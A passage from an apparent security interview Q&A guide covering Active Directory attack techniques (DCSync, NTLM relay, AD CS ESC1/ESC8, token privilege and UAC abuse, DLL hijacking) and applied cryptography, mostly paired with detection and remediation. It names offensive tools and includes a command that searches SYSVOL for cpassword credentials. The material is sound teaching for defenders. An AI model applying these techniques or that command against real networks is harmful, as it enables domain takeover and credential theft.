  - **Resource-Based Constrained Delegation (`RBCD`, `msDS-AllowedToActOnBehalfOfOtherIdentity`):** Shifts control to the **target resource** (`BackendServer$`). Anyone with `GenericWrite` / `WriteProperty` over a target computer object can populate `msDS-AllowedToActOnBehalfOfOtherIdentity` with the SID of a controlled machine account (`MachineAccountQuota` = 10 by default) and use `S4U2Self` + `S4U2Proxy` to compromise the target computer as `SYSTEM`.

**Q70. What is a DCSync attack (`T1003.006`), which Active Directory extended rights permit it, and how is it detected?**
- **Answer:** DCSync abuses the Microsoft Directory Replication Service Remote Protocol (`MS-DRSR` / `DRSGetNCChanges` RPC call) to impersonate a Domain Controller and request replication of password hashes (including `krbtgt` and all domain users) from a real DC without executing code on the DC or touching the `NTDS.dit` file on disk. It requires an identity holding two extended rights on the Domain root object: **`DS-Replication-Get-Changes`** (`1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`) and **`DS-Replication-Get-Changes-All`** (`1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`)—held by default by `Domain Admins`, `Enterprise Admins`, `Administrators`, and `Domain Controllers`. **Detection:** Monitor Windows Security Event ID **`4662`** on Domain Controllers where `Properties` contains `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` or `Replicating Directory Changes All` originating from a `SubjectUserSid` / IP address that is **not** a legitimate Domain Controller.

**Q71. Compare Pass-the-Hash (PtH), Overpass-the-Hash (Pass-the-Key), and NTLM Relay attacks, and explain why you CANNOT "Pass-the-Hash" a Net-NTLMv2 challenge/response.**
- **Answer:**
  - **Pass-the-Hash (PtH):** Because standard NTLM authentication derives its challenge-response HMAC directly from the static 16-byte `MD4(UTF-16LE(password))` **NT Hash**, possessing the raw NT hash from SAM/LSASS is mathematically equivalent to possessing the plaintext password for NTLM authentication.
  - **Overpass-the-Hash (Pass-the-Key):** Uses a stolen NT hash (or AES-128/AES-256 Kerberos key) to encrypt a Kerberos `KRB_AS_REQ` pre-authentication timestamp, exchanging the hash for a legitimate **Kerberos TGT** so subsequent lateral movement uses Kerberos instead of NTLM.
  - **Why Net-NTLMv2 Cannot Be Passed:** A captured **Net-NTLMv2** response (captured via `Responder` over SMB/HTTP) is an `HMAC-MD5` computed over a **one-time 8-byte Server Challenge** issued by a specific server for a single connection. You cannot reuse that response against another server because the next server will issue a different random 8-byte challenge. Instead, an attacker must either **crack** the Net-NTLMv2 hash offline (`Hashcat -m 5600`) or **Relay** it in real time (**NTLM Relay**) to a target server that does not enforce **SMB Signing**, **LDAP Signing / Channel Binding**, or **EPA (Extended Protection for Authentication)**.

**Q72. What are LLMNR, NetBIOS-NS (`NBT-NS`), and mDNS Poisoning, and how do you remediate them via Group Policy?**
- **Answer:** When a Windows host fails to resolve a hostname via standard DNS (e.g., a typo in a share path `\\filesvr\share`), it falls back to link-local multicast/broadcast name resolution over **LLMNR (`UDP/5355`)**, **NBT-NS (`UDP/137`)**, and **mDNS (`UDP/5353`)**. An attacker on the same subnet running `Responder` replies claiming to be `filesvr`, coercing the victim host to send its **Net-NTLMv2 challenge-response** over SMB/HTTP. **Remediation:**
  1. Disable LLMNR via GPO: `Computer Configuration -> Administrative Templates -> Network -> DNS Client -> Turn off multicast name resolution = Enabled`.
  2. Disable NetBIOS-NS via DHCP scope option `001` (`0x2`) or PowerShell registry configuration on network adapters (`NetbiosOptions = 2`).
  3. Enforce **SMB Signing** (`Microsoft network server: Digitally sign communications (always) = Enabled`) across all workstations and servers to block SMB NTLM Relaying.

**Q73. What is `lsass.exe` (Local Security Authority Subsystem Service), why do attackers target it, and what Windows features protect it?**
- **Answer:** `lsass.exe` validates local and domain logons, enforces local security policies, generates access tokens, and caches active authentication material (NTLM hashes, Kerberos tickets/keys, DPAPI master keys, and legacy WDigest cleartext passwords) in memory. **Protections:**
  1. **RunAsPPL (Protected Process Light):** Setting `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1` runs `lsass.exe` as a signed protected process; the Windows kernel strips `PROCESS_VM_READ` (`0x0010`) from any handle opened by non-PPL user-mode processes (even processes running as `NT AUTHORITY\SYSTEM` with `SeDebugPrivilege`).
  2. **Windows Defender Credential Guard (VBS / Hyper-V Isolated LSA, `LsaIso.exe`):** Uses Virtualization-Based Security (Hypervisor-enforced Isolated User Mode, VTL1) to store NTLM hashes and Kerberos TGTs inside an isolated hypervisor container completely inaccessible to the normal Windows OS kernel (VTL0).

**Q74. Explain the Active Directory Certificate Services (AD CS) escalation templates `ESC1` and `ESC8`, and how to remediate them.**
- **Answer:**
  - **`ESC1` (Misconfigured Certificate Template):** Occurs when a Certificate Template: (1) grants `Enroll` permissions to low-privileged domain users, (2) does not require Manager Approval or Authorized Signatures, (3) enables a **Client Authentication EKU** (`1.3.6.1.5.5.7.3.2` or `Smart Card Logon` / `Any Purpose`), and (4) sets **`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`** (`msPKI-Certificate-Name-Flag = 1`), allowing any user to specify an arbitrary **Subject Alternative Name (SAN)** (such as `Administrator@corp.local`) in the CSR and authenticate via PKINIT (`Schannel`/Kerberos) as a Domain Admin.
  - **`ESC8` (NTLM Relay to AD CS HTTP Web Enrollment):** The legacy AD CS Web Enrollment service (`/certsrv/`) accepts NTLM authentication over plain HTTP without Extended Protection for Authentication (EPA). An attacker coerces a Domain Controller (`DC01$`) to authenticate to the attacker and relays the NTLM handshake to `http://ca.corp.local/certsrv/certfnsh.asp`, enrolling a Domain Controller client authentication certificate.
  - **Remediation:** Disable `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` on templates with Client Auth EKUs (or require CA Manager Approval), disable the IIS `/certsrv/` HTTP endpoint if unused, and enforce HTTPS with **EPA (`Extended Protection = Required`)** and **Disable NTLM** on all AD CS enrollment endpoints.

**Q75. What are the most dangerous Windows Access Token Privileges (`whoami /priv`) and how can each be abused to escalate to `SYSTEM`?**
- **Answer:**
  - `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege`: Allows a service account (`IIS`, `MSSQL`, `Network Service`) to impersonate a `SYSTEM` token via RPC/Named Pipe coercion (`PrintSpoofer`, `GodPotato`, `JuicyPotatoNG`).
  - `SeDebugPrivilege`: Allows opening `PROCESS_ALL_ACCESS` handles to any `SYSTEM` process (e.g., `winlogon.exe`) to inject shellcode or spawn a child process with `winlogon.exe` as the parent (`PPID Spoofing`).
  - `SeBackupPrivilege`: Grants read access to **any file on the system** bypassing all NTFS DACLs when opened with `FILE_FLAG_BACKUP_SEMANTICS`, allowing extraction of `C:\Windows\System32\config\SAM`, `SYSTEM`, or `C:\Windows\NTDS\ntds.dit` via Volume Shadow Copies (`diskshadow`).
  - `SeRestorePrivilege` / `SeTakeOwnershipPrivilege`: Allows writing/overwriting arbitrary system files (`utilman.exe`, service binaries) or taking ownership of any registry key/file bypassing ACLs.
  - `SeLoadDriverPrivilege`: Allows loading a signed vulnerable kernel driver (e.g., `capcom.sys`) to execute arbitrary ring-0 code.

**Q76. Explain LAPS (Windows Local Administrator Password Solution) and why a shared local Administrator password across workstations is catastrophic.**
- **Answer:** If workstations share an identical local Administrator password (or come from the same unrandomized gold image), compromising a single workstation allows an attacker to dump its local `SAM` hive (`RID 500`) and use **Pass-the-Hash** laterally across every workstation in the enterprise until finding one where a Domain Admin has an active interactive session. **Windows LAPS** automatically generates a unique, cryptographically random password for each computer's local Administrator account, rotates it on a scheduled policy, and stores it encrypted in Active Directory (`msLAPS-EncryptedPassword`) accessible only to authorized Tier-2 helpdesk ACLs.

**Q77. What is the `AdminSDHolder` object and `SDProp` background process in Active Directory?**
- **Answer:** To prevent accidental or malicious weakening of permissions on high-privilege accounts and groups (`Protected Groups` such as `Domain Admins`, `Enterprise Admins`, `Schema Admins`, `Administrators`, `Account Operators`, `Backup Operators`, `Server Operators`, `Print Operators`), the **PDC Emulator** Domain Controller runs the **SDProp (Security Descriptor Propagator)** background task every **60 minutes**. `SDProp` compares the DACL of every protected user and group against the template DACL stored on `CN=AdminSDHolder,CN=System,DC=domain,DC=tld`. If they differ, `SDProp` overwrites the object's ACL with the `AdminSDHolder` template and disables ACL inheritance (`adminCount=1`). Conversely, if an attacker gains `WriteDacl` on `CN=AdminSDHolder` itself, `SDProp` will automatically propagate their backdoor ACE to every Tier-0 admin account in the forest within 60 minutes.

**Q78. How do BloodHound / SharpHound map Active Directory attack paths, and what are the most critical non-default ACL edges to remediate?**
- **Answer:** SharpHound queries LDAP and SMB/RPC endpoints to build a directed graph of AD users, groups, computers, OUs, GPOs, and ACL relationships. Critical ACL edges include:
  - `GenericAll`: Full control over the target object (reset password, add group members, edit attributes).
  - `GenericWrite`: Can modify non-protected attributes (add `servicePrincipalName` for Targeted Kerberoasting, or set `msDS-KeyCredentialLink` for **Shadow Credentials** PKINIT takeover).
  - `WriteDacl`: Can modify the target object's DACL to grant oneself `GenericAll`.
  - `WriteOwner`: Can change object ownership to oneself, then modify the DACL.
  - `ForceChangePassword` (`User-Force-Change-Password` extended right): Can reset a target user's password without knowing their current password.
  - `AddKeyCredentialLink`: Allows writing a rogue public key to `msDS-KeyCredentialLink` to authenticate as the victim user or computer via `PKINIT` (`Whisker` / `Certipy`).

**Q79. Why were Group Policy Preferences (GPP) `cpassword` attributes (`MS14-025`) a severe vulnerability, and why are they still checked during AD audits?**
- **Answer:** Windows Server 2008 introduced Group Policy Preferences allowing administrators to push local user passwords inside XML files (`Groups.xml`, `Services.xml`, `ScheduledTasks.xml`) stored in the world-readable `\\<DOMAIN>\SYSVOL` share. Although the password was AES-256 encrypted in the `cpassword` attribute, Microsoft publicly published the static 32-byte AES key in MSDN documentation. Any authenticated domain user can scan `SYSVOL` for `cpassword` (`findstr /S /I cpassword \\corp.local\sysvol\*.xml`) and decrypt it instantaneously (`gpp-decrypt`). Even after installing `MS14-025` (which blocks creating *new* GPP passwords), legacy XML files remain in `SYSVOL` until manually deleted.

**Q80. Explain PowerShell security controls: Constrained Language Mode (CLM), Script Block Logging (`Event ID 4104`), Module Logging (`4103`), and AMSI.**
- **Answer:**
  - **Constrained Language Mode (CLM):** Enforced alongside AppLocker / WDAC (`__PSLockdownPolicy`), restricts PowerShell to core cmdlets and blocks arbitrary `.NET` type invocation (`Add-Type`), Win32 API calls (`P/Invoke`), and COM object creation.
  - **Script Block Logging (`Event ID 4104` in `Microsoft-Windows-PowerShell/Operational`):** Captures the full, de-obfuscated source code of every PowerShell script block as it is compiled by the engine—even if it was passed via `-EncodedCommand` or dynamically constructed with `Invoke-Expression`.
  - **AMSI (Antimalware Scan Interface, `amsi.dll`):** Integrates directly into `System.Management.Automation.dll`, VBScript, JScript, and .NET `Assembly.Load(byte[])` (since .NET 4.8) to pass in-memory buffers to the registered EDR/Defender engine *after* unpacking/de-obfuscation but *before* execution.
  - **Preventing PowerShell v2 Downgrade Attacks:** Uninstall the `MicrosoftWindowsPowerShellV2` feature (`Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root`), as PowerShell v2 lacks Script Block Logging and AMSI.

**Q81. What is DPAPI (Windows Data Protection API), and how does it protect browser cookies, saved credentials, and private keys?**
- **Answer:** DPAPI (`CryptProtectData` / `CryptUnprotectData`) provides symmetric encryption for user and machine secrets (Credential Manager, Chrome/Edge cookies encrypted with an AES key wrapped by DPAPI, RDS files, EFS keys). Data is encrypted with a **DPAPI MasterKey** stored in `%APPDATA%\Microsoft\Protect\<SID>\`. User MasterKeys are encrypted with a key derived from the user's Windows login password, **AND** a backup copy is encrypted using the Active Directory **Domain DPAPI Backup Key** (stored on Domain Controllers). Consequently, an attacker who compromises a Domain Admin and extracts the Domain DPAPI Backup Key can decrypt any domain user's MasterKey and saved credentials offline without knowing the user's password.

**Q82. How does Windows User Account Control (UAC) work with Split Tokens, and why does Microsoft not classify UAC bypasses as a security boundary?**
- **Answer:** When a member of the local `Administrators` group logs into Windows (`Admin Approval Mode`), `lsass.exe` creates **two access tokens**: a **Filtered Token** (Medium Integrity Level, with administrative SIDs set to `SE_GROUP_USE_FOR_DENY_ONLY` and sensitive privileges stripped) used to launch `explorer.exe`, and a linked **Elevated Token** (High Integrity Level, full admin rights). A UAC bypass abuses **`autoElevate=true`** signed Microsoft binaries (such as `fodhelper.exe`, `eventvwr.exe`, `sdclt.exe`, or elevated COM interfaces like `ICMLuaUtil`) that read registry keys in `HKCU:\Software\Classes\...` (writable from Medium Integrity) to spawn a child process under the linked High Integrity token without prompting. Microsoft defines the security boundary between different user accounts, not between Medium and High integrity within the same local Administrator session; true defense requires removing regular users from local `Administrators`.

**Q83. Compare AppLocker and Windows Defender Application Control (WDAC).**
- **Answer:** **AppLocker** enforces user-mode execution rules (Publisher, Path, or File Hash) on `.exe`, `.dll`, `.msi`, `.ps1`, `.vbs`, and `.Appx` via the `AppIDSvc` service, primarily designed to restrict standard users. **WDAC (Device Guard / Configurable Code Integrity)** is enforced deep inside the Windows Kernel (`ci.dll`) before `ntoskrnl` maps executable code or kernel drivers, integrates with UEFI Secure Boot and Hypervisor-Protected Code Integrity (HVCI), and cannot be bypassed even by `LocalSystem` or local Administrators.

**Q84. What is SMB Signing, and what is the performance vs. security trade-off of enabling `Digitally sign communications (always)`?**
- **Answer:** SMB Signing places an `AES-128-CMAC` (or `AES-128-GMAC` in SMB 3.1.1) cryptographic signature into the header of every SMB packet using the authenticated session key. It completely prevents **SMB NTLM Relay (`T1557.001`)** and Man-in-the-Middle tampering. By default, Windows only *requires* SMB Signing on Domain Controllers, leaving member servers and workstations set to *negotiate* (not required)—allowing an attacker to relay NTLM authentication from any host to any member server. Modern CPUs with `AES-NI` hardware acceleration incur minimal overhead with SMB 3.1.1 `AES-128-GMAC` signing, and Windows 11 24H2 / Windows Server 2025 now enforce SMB Signing by default across all connections.

**Q85. How do DLL Search Order Hijacking and DLL Side-Loading (`T1574.001` / `T1574.002`) work on Windows?**
- **Answer:** When a Windows application calls `LoadLibrary("version.dll")` without specifying an absolute path and the DLL is not in the `KnownDLLs` registry list (`HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`), Windows searches directories in a strict order: (1) **The directory from which the application loaded**, (2) `C:\Windows\System32`, (3) `C:\Windows\System`, (4) `C:\Windows`, (5) the Current Working Directory, and (6) directories in the `%PATH%` environment variable. If a privileged service loads from a writable application directory (or has a writable directory in the system `%PATH%`), placing a proxy DLL in that directory executes code under the service's identity. **DLL Side-Loading** copies a legitimate, digitally signed executable (e.g., a signed vendor updater) into an attacker-controlled folder alongside a malicious DLL bearing the name of an imported dependency, abusing step (1) of the search order to bypass signature-based EDR checks.

---

## 54.5 Section 5: Applied Cryptography & PKI (Questions 86–105)

**Q86. Differentiate between Encryption, Encoding, Hashing, and Tokenization.**
- **Answer:**
  - **Encoding (`Base64`, `UTF-8`, `URL Encoding`, `Hex`):** Reversible data format transformation using a publicly known scheme with **no secret key**; provides zero confidentiality.
  - **Encryption (`AES-256-GCM`, `ChaCha20-Poly1305`, `RSA-OAEP`):** Reversible mathematical transformation governed by a **cryptographic key** to guarantee confidentiality.
  - **Hashing (`SHA-256`, `SHA3-256`, `BLAKE3`):** One-way, deterministic mathematical function mapping arbitrary-length input to a fixed-size digest with pre-image, second pre-image, and collision resistance.
  - **Tokenization:** Replaces a sensitive data element (such as a 16-digit PCI-DSS Primary Account Number) with a non-sensitive surrogate UUID/token mapped in a secure centralized token vault; cannot be mathematically reversed from the token alone.

**Q87. Why is `AES-ECB` (Electronic Codebook) mode insecure for multi-block data, and why is `AES-GCM` (Galois/Counter Mode) preferred over `AES-CBC`?**
- **Answer:** `AES-ECB` encrypts each 128-bit (16-byte) plaintext block independently using the exact same key (`C_i = E_K(P_i)`). Identical plaintext blocks produce identical ciphertext blocks (preserving visual patterns, as demonstrated by the classic ECB Penguin image) and allow block replay/reordering. `AES-CBC` XORs each plaintext block with the previous ciphertext block (`IV` for block 0), hiding patterns, but is malleable, sequential during encryption, and vulnerable to **Padding Oracle attacks (Vaudenay / POODLE)** if decryption padding errors (`PKCS#7`) are distinguishable. **`AES-GCM`** is an **AEAD (Authenticated Encryption with Associated Data)** mode that combines Counter (`CTR`) mode encryption (fully parallelizable, no padding required) with a **GHASH Galois field MAC** (`128-bit authentication tag`), simultaneously guaranteeing both **Confidentiality** and **Integrity/Authenticity**.

**Q88. What happens if a 96-bit Nonce/IV is reused with the same key in `AES-GCM` or `ChaCha20-Poly1305`?**
- **Answer:** Catastrophic failure of both confidentiality and authenticity (**"Nonce Reuse Attack / Forbidden Attack"**):
  1. Because `CTR` mode generates a keystream $S = E_K(\text{Nonce} \parallel \text{Counter})$ and XORs it with plaintext ($C_1 = P_1 \oplus S$, $C_2 = P_2 \oplus S$), XORing two ciphertexts encrypted with the same key and nonce completely cancels out the keystream: $C_1 \oplus C_2 = P_1 \oplus P_2$, allowing recovery of both plaintexts.
  2. In `AES-GCM`, XORing the authentication tags of two messages sharing a nonce allows an attacker to solve a polynomial equation in $GF(2^{128})$ to recover the internal authentication key **$H = E_K(0^{128})$**, enabling universal forgery of valid authentication tags for arbitrary future messages. **Mitigation:** Use random nonces only with **AES-GCM-SIV (RFC 8452 — Nonce Misuse-Resistant AEAD)** or `XChaCha20-Poly1305` (192-bit nonce).

**Q89. Explain a CBC Padding Oracle Attack (`CWE-649`) and how `Encrypt-then-MAC` prevents it.**
- **Answer:** In `AES-CBC` with `PKCS#7` padding, valid padding ends with `0x01`, `0x02 0x02`, ..., up to `0x10` repeated 16 times. Because $P_i = D_K(C_i) \oplus C_{i-1}$, if a server reveals whether a modified ciphertext produced a `BadPaddingException` (`500 Internal Server Error` or timing difference) versus an application error (`200 OK`), an attacker can flip bytes in $C_{i-1}$ one byte at a time (at most 256 guesses per byte) to deduce the intermediate state $D_K(C_i)$ and decrypt arbitrary ciphertexts—or encrypt arbitrary plaintexts—without knowing the key $K$. **Mitigation:** Use an AEAD mode (`AES-GCM`) or enforce **Encrypt-then-MAC (`EtM`)**, where the server verifies an `HMAC-SHA256` over `(IV || Ciphertext)` in constant time *before* ever attempting CBC decryption.

**Q90. What is a Hash Length Extension Attack, which hash functions are vulnerable, and why are `HMAC` and `SHA-3` immune?**
- **Answer:** Hash functions built on the **Merkle–Damgård** construction (`MD5`, `SHA-1`, `SHA-256`, `SHA-512`) process messages in fixed blocks and output their final internal state registers directly as the hash digest. If an application computes a naive signature as $H(\text{secret} \parallel \text{message})$, an attacker who knows the length of $\text{secret}$ and the digest $H(\text{secret} \parallel \text{message})$ can use that digest as the initial internal state to append arbitrary data ($\text{padding} \parallel \text{append\_data}$) and compute a valid hash for $H(\text{secret} \parallel \text{message} \parallel \text{padding} \parallel \text{append\_data})$ without knowing $\text{secret}$.
  - **Why `HMAC` is immune:** $\text{HMAC}(K, m) = H\big((K' \oplus \text{opad}) \parallel H((K' \oplus \text{ipad}) \parallel m)\big)$ hashes the inner digest a second time with an outer secret key pad.
  - **Why `SHA-3` (`Keccak`) and `BLAKE2`/`BLAKE3` are immune:** `SHA-3` uses a **Sponge construction** with a hidden capacity state ($c$) that is never output in the digest, preventing state reconstruction.

**Q91. Compare RSA, Diffie-Hellman (DH), and Elliptic Curve Cryptography (`ECDSA`, `Ed25519`, `X25519`) in terms of mathematical hardness, key sizes, and performance.**
- **Answer:**
  - **RSA:** Hardness relies on the **Integer Factorization Problem** ($N = p \times q$). Requires **3072-bit** (or minimum 2048-bit) keys to provide ~112–128 bits of security. Slow key generation and large signatures.
  - **Classic Diffie-Hellman (FFDHE):** Hardness relies on the **Discrete Logarithm Problem (DLP)** in finite fields $\mathbb{Z}_p^*$; requires 2048–3072-bit moduli.
  - **Elliptic Curve Cryptography (`X25519` for ECDH key agreement, `Ed25519` for EdDSA signatures):** Hardness relies on the **Elliptic Curve Discrete Logarithm Problem (ECDLP)**. A **256-bit** elliptic curve key provides **128-bit security** (equivalent to 3072-bit RSA) with much smaller keys, faster signature generation, and deterministic constant-time execution (in `Ed25519` / `Curve25519`) that resists timing side-channel attacks and nonce-reuse bugs.

**Q92. What happened in the Sony PlayStation 3 / Bitcoin `ECDSA` Nonce Reuse vulnerability?**
- **Answer:** In `ECDSA`, signing a message hash $z$ with private key $d_A$ requires generating a unique, cryptographically random ephemeral secret **$k$** for every single signature: $s = k^{-1}(z + r \cdot d_A) \pmod n$, where $r = (k \cdot G)_x \pmod n$. If the exact same value of $k$ is ever used to sign two different messages $z_1$ and $z_2$, both signatures will have the exact same $r$ value, and anyone can algebraically compute $k = (z_1 - z_2)(s_1 - s_2)^{-1} \pmod n$ and immediately solve for the private key $d_A = r^{-1}(s_1 \cdot k - z_1) \pmod n$. **Mitigation:** Use **RFC 6979 Deterministic ECDSA** (where $k$ is derived deterministically via `HMAC_DRBG(private_key, message_hash)`) or use **`Ed25519`**, which computes deterministic nonces natively by design.

**Q93. Why must raw RSA ("Textbook RSA") never be used without padding, and why is `RSA-OAEP` (`PKCS#1 v2.1`) required instead of legacy `PKCS#1 v1.5`?**
- **Answer:** Textbook RSA ($C = M^e \pmod N$) is completely deterministic (identical plaintexts produce identical ciphertexts), malleable ($E(M_1) \cdot E(M_2) = E(M_1 \cdot M_2) \pmod N$), and vulnerable to small-exponent roots ($M^3 < N$). Legacy **`PKCS#1 v1.5`** encryption padding (`0x00 0x02 || random_non_zero || 0x00 || M`) is vulnerable to **Bleichenbacher's Adaptive Chosen-Ciphertext Attack (ROBOT attack)**, where an attacker sends ~1 million modified ciphertexts and observes whether the server returns a padding validation error (`0x00 0x02` prefix check). **`RSA-OAEP` (Optimal Asymmetric Encryption Padding)** uses a two-stage Feistel network with cryptographic hash functions (`MGF1-SHA256`) to provide provable `IND-CCA2` security, while **`RSA-PSS` (Probabilistic Signature Scheme)** is used for digital signatures.

**Q94. Explain Perfect Forward Secrecy (PFS) and how Ephemeral Diffie-Hellman (`ECDHE`) achieves it.**
- **Answer:** **Perfect Forward Secrecy** guarantees that even if a server's long-term private key (e.g., its RSA/ECDSA TLS certificate private key) is stolen or compromised years in the future, an adversary who recorded past encrypted network traffic (`PCAP`) **cannot decrypt those historical sessions**. In `ECDHE`, the server's TLS certificate private key is used **only to digitally sign** the ephemeral Diffie-Hellman public parameters during the handshake (preventing active MitM). The actual symmetric session key is derived from ephemeral in-memory `X25519`/`P-256` key pairs generated fresh for each connection and destroyed immediately after session closure.

**Q95. Walk through the X.509 Public Key Infrastructure (PKI) trust hierarchy, Certificate Transparency (CT), and OCSP Stapling.**
- **Answer:**
  - **Trust Hierarchy:** Offline air-gapped **Root CA** (self-signed, stored in HSMs, embedded in OS/browser trust stores) signs **Intermediate (Issuing) CAs**, which in turn sign end-entity **Leaf Certificates**.
  - **Revocation Checking:** Historically used **CRLs (Certificate Revocation Lists)** (large downloadable files) or **OCSP (Online Certificate Status Protocol)** (where the browser queries the CA's OCSP responder in real time—leaking user browsing privacy and adding latency). **OCSP Stapling** solves both problems: the web server itself queries the CA's OCSP responder periodically, caches a digitally signed, timestamped OCSP response, and "staples" it directly into the TLS handshake (`CertificateStatus`).
  - **Certificate Transparency (CT, RFC 6962):** Requires CAs to publish every issued certificate to public, append-only **Merkle Tree CT Logs** and embed **SCTs (Signed Certificate Timestamps)** inside the certificate, enabling domain owners to immediately detect rogue or mis-issued certificates.

**Q96. What is the difference between a MAC (`HMAC-SHA256`) and a Digital Signature (`Ed25519` / `RSA-PSS`) with respect to Non-Repudiation?**
- **Answer:** Both provide **Message Integrity** and **Authentication**. However, an **HMAC** uses a **shared symmetric secret key** known to both the sender and the verifier; therefore, either party could have computed the HMAC, meaning a verifier cannot prove to a third-party judge that the sender created the message (**no Non-Repudiation**). A **Digital Signature** is generated using a **Private Key** known solely to the signer and verified using a publicly distributed **Public Key**, providing cryptographic **Non-Repudiation**.

**Q97. What threat does Quantum Computing (Shor's Algorithm vs. Grover's Algorithm) pose to modern cryptography, and what are the NIST Post-Quantum Cryptography (PQC) standards?**
- **Answer:**
  - **Shor's Algorithm** on a sufficiently powerful cryptographically relevant quantum computer (CRQC) solves integer factorization and discrete logarithms in polynomial time—**completely breaking RSA, DH, ECDH (`X25519`), and ECDSA (`Ed25519`)** ("Harvest Now, Decrypt Later" threat).
  - **Grover's Algorithm** provides only a quadratic speedup ($O(2^{n/2})$) against symmetric ciphers and hashes: **AES-256** retains 128 bits of quantum security, and **SHA-384 / SHA-512** remain completely secure.
  - **NIST Post-Quantum Cryptography Standards (2024):**
    - **FIPS 203 (`ML-KEM` / CRYSTALS-Kyber):** Module-Lattice-Based Key-Encapsulation Mechanism for general encryption / TLS hybrid key exchange (`X25519MLKEM768`).
    - **FIPS 204 (`ML-DSA` / CRYSTALS-Dilithium):** Module-Lattice-Based Digital Signature Algorithm.
    - **FIPS 205 (`SLH-DSA` / SPHINCS+):** Stateless Hash-Based Digital Signature Algorithm.

**Q98. Why does comparing cryptographic MACs or tokens using standard `==` or `strcmp()` introduce a Timing Side-Channel Vulnerability (`CWE-208`)?**
- **Answer:** Standard string comparison routines (`==`, `memcmp`, `strcmp`) use short-circuit evaluation: they compare byte-by-byte from index `0` and return `false` on the **very first mismatched byte**. By measuring nanosecond/microsecond response time differences over thousands of requests, an attacker can guess the first byte that takes slightly longer, then the second byte, reducing a $2^{256}$ brute-force search into $256 \times 32 = 8,192$ operations. **Remediation:** Always use a **constant-time comparison function** (`hmac.compare_digest()` in Python, `crypto.timingSafeEqual()` in Node.js, `MessageDigest.isEqual()` in Java, `subtle.ConstantTimeCompare()` in Go) that XORs every byte across the entire buffer length before returning.

**Q99. What is Envelope Encryption in Cloud Key Management Systems (AWS KMS, HashiCorp Vault, Google Cloud KMS)?**
- **Answer:** Asymmetric HSM keys or KMS Customer Master Keys (CMKs) have strict size limits (e.g., 4 KB in AWS KMS) and cannot encrypt gigabytes of database files over network API calls. **Envelope Encryption** generates a unique, ephemeral 256-bit **Data Encryption Key (DEK)** locally, encrypts the large payload using `AES-256-GCM` with the DEK, encrypts ("wraps") the 32-byte DEK using the HSM-backed **Key Encryption Key (KEK / CMK)** (`kms:GenerateDataKey`), stores the encrypted DEK alongside the ciphertext, and wipes the plaintext DEK from RAM.

**Q100. Explain the Birthday Paradox in cryptography and why a 128-bit hash function only provides 64 bits of collision resistance.**
- **Answer:** Due to the Birthday Problem in probability theory, finding *any two arbitrary inputs* $m_1 \neq m_2$ such that $H(m_1) = H(m_2)$ (**Collision Resistance**) requires only approximately **$2^{n/2}$** hash evaluations for an $n$-bit hash output (whereas finding an input matching a *specific target digest*—**Pre-image Resistance**—requires $2^n$ operations). Thus, a 128-bit hash like MD5 requires only $2^{64}$ operations for a collision (and even fewer due to differential cryptanalysis), whereas `SHA-256` provides $2^{128}$ collision resistance and $2^{256}$ pre-image resistance.

**Q101. What is an Hardware Security Module (HSM) and a Trusted Platform Module (TPM 2.0), and how do they protect cryptographic keys?**
- **Answer:** Both are tamper-resistant cryptographic co-processors where private keys are generated inside hardware boundaries and **never leave the hardware in plaintext** (all signing/decryption happens inside the module):
  - **TPM 2.0:** Soldered onto a motherboard (or firmware fTPM) to provide **Measured Boot** via **PCRs (Platform Configuration Registers)**, sealing BitLocker/LUKS disk encryption keys so they are released only if the UEFI firmware, bootloader, and OS kernel hashes match known-good states.
  - **HSM (FIPS 140-3 Level 3/4):** High-throughput network/PCIe appliance used by Certificate Authorities, payment switches (PCI-PTS/HSM), and cloud KMS to perform thousands of cryptographic operations per second with physical tamper-zeroization sensors.

**Q102. Why must developers use a CSPRNG (`secrets` in Python, `crypto.randomBytes` in Node.js, `/dev/urandom`) instead of `Math.random()` or `random.randint()`?**
- **Answer:** Standard PRNGs (`random` module in Python uses **Mersenne Twister MT19937**; `Math.random()` in V8 uses **xorshift128+**) are designed for statistical simulation speed, not security. Observing just 624 consecutive 32-bit outputs from MT19937 (or a handful of outputs from `xorshift128+`) allows an attacker to algebraically reconstruct the entire internal state of the generator and predict **all past and future** password reset tokens, CSRF nonces, or session IDs.

**Q103. How does Passwordless Authentication via WebAuthn / FIDO2 Passkeys eliminate phishing and credential stuffing?**
- **Answer:** During registration with `https://bank.lk`, the user's hardware authenticator (YubiKey, TouchID/Windows Hello TPM) generates a unique **origin-bound asymmetric key pair (`ECDSA P-256` or `Ed25519`)** scoped specifically to the Relying Party ID (`rpId = bank.lk`). During login, the server sends a random challenge; the browser passes both the challenge and the **verified browser origin (`https://bank.lk`)** to the authenticator, which signs them with the private key after local biometric/PIN verification. Even if a user is tricked onto a lookalike phishing domain (`https://b4nk.lk`), the browser passes `rpId = b4nk.lk`, so the FIDO2 authenticator refuses to use the `bank.lk` key—making FIDO2 cryptographically immune to phishing, AiTM (Adversary-in-the-Middle) proxies (`Evilginx`), and server database leaks.

**Q104. What is Format-Preserving Encryption (FPE, NIST SP 800-38G `FF1`), and where is it used in banking systems?**
- **Answer:** Standard block ciphers (`AES-GCM`) turn a 16-digit credit card number or 12-digit NIC number into binary bytes + nonce + tag, breaking legacy Mainframe/COBOL/ERP database columns that strictly require a 16-digit numeric string. **Format-Preserving Encryption (`FF1`)** uses a Feistel network keyed with AES and a tweak to encrypt a 16-digit number (or Luhn-valid PAN) into **another 16-digit number**, preserving column schema compatibility while encrypting data at rest.

**Q105. What is Zero-Knowledge Proof (ZKP / zk-SNARKs / SRP) in authentication and privacy engineering?**
- **Answer:** A Zero-Knowledge Proof allows a **Prover** to mathematically convince a **Verifier** that a statement is true (or that the Prover knows a secret $x$) **without revealing any information about $x$ itself**. Examples include **SRP (Secure Remote Password protocol)** and **OPAQUE (aPAKE)**, where a client proves knowledge of their password to a server without ever transmitting the password or allowing the server to store a password-equivalent cleartext secret.

---

## 54.6 Section 6: Cloud, Container & DevSecOps Security (Questions 106–125)

**Q106. Explain the Cloud Shared Responsibility Model across IaaS, PaaS, and SaaS.**
